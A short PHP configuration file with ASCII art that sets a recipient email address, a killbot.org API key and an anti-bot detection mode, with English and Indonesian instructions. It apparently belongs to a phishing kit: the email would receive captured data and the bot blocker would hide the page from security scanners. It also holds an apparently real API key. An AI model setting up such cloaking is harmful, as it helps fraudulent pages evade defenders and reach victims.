<?php
/*
── ── ██ ██ ── ── ── ── ── ── ── ██ ██ ── ──
── ██ ░░ ░░ ██ ██ ██ ██ ██ ▓▓ ▓▓ ░░ ░░ ██ ──
── ██ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ▓▓ ▓▓ ▓▓ ▓▓ ██ ──
── ── ██ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ▓▓ ▓▓ ── ──
── ██ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ██ ──
── ██ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ██ ──
██ ██ ░░ ░░ ██ ░░ ░░ ░░ ░░ ░░ ██ ░░ ░░ ██ ██
── ██ ░░ ░░ ██ ░░ ░░ ░░ ░░ ░░ ██ ░░ ░░ ██ ──
██ ██ ░░ ░░ ░░ ░░ ░░ ▌▌ ░░ ░░ ░░ ░░ ░░ ██ ██
── ── ██ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ██ ── ──
── ██ ░░ ██ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ██ ░░ ██ ──
── ── ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ── ──
── ██ ▒▒ ▒▒ ▓▓ ▓▓ ▒▒ ▒▒ ▒▒ ▓▓ ▓▓ ▒▒ ▒▒ ██ ──
██ ▒▒ ▒▒ ▒▒ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▒▒ ▒▒ ▒▒ ██
██ ░░ ░░ ██ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ██ ░░ ░░ ██
██ ░░ ░░ ██ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ██ ░░ ░░ ██
── ██ ██ ██ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ██ ██ ██ ──
── ── ── ██ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ▓▓ ██ ── ── ──
── ── ── ██ ██ ██ ██ ██ ██ ██ ██ ██ ── ── ──
── ── ── ██ ░░ ░░ ░░ ██ ░░ ░░ ░░ ██ ── ── ──
── ── ── ── ██ ██ ██ ██ ██ ██ ██ ── ── ── ──
                                                                            
CREATED BY Don_Lakost3

READ ME!

1. Change 'YOUR_APIKEY' with your own apikey that you can found at https://killbot.org/developers

Eeample: 
$killbot_apikey = '4KUQqw0A0Pf72vCLS2YhrsEqZl8soxwHvw_Y6WyVTF8oJ';

2. Select your detection type using is_bot or block_access parameter. What is it?
- Option 1 = using 'is_bot', means it will block every access that is detected as bots without exception
(ID: menggunakan opsi 1 / 'is_bot', berarti akan memblok setiap akses yang terdeteksi sebagai bot tanpa terkecuali)
- Option 2 = using 'block_access', bots that are detected will not be blocked immediately but instead depending on your settings on https://killbot.org/blocker, so if you choose the block type option 'NO BLOCKED' then there will be no blocking.
(ID: menggunakan opsi 2 / 'block_access', bot yang terdeteksi tidak akan langsung diblokir melainkan tergantung settinganmu pada https://killbot.org/blocker, jadi jika kamu memilih opsi tipe block 'NO BLOCKED' maka tidak akan terjadi pemblockan.)
 *
Example:
$killbot_detect_by = 2;

*/

$emailku            = 'admin@kenwilliamtwombly.org'; // Set your email
$killbot_apikey     = 'kontol0tZO8wdXF4FPfKU-qI9SNJlGaVoq4oThMa7A07-rHRc-H'; // https://killbot.org/developers
$killbot_detect_by  = 2; // Detection by parameter 'is_bot' or 'block_access'. Option 1 = 'is_bot' and 2 = 'block_access'

?>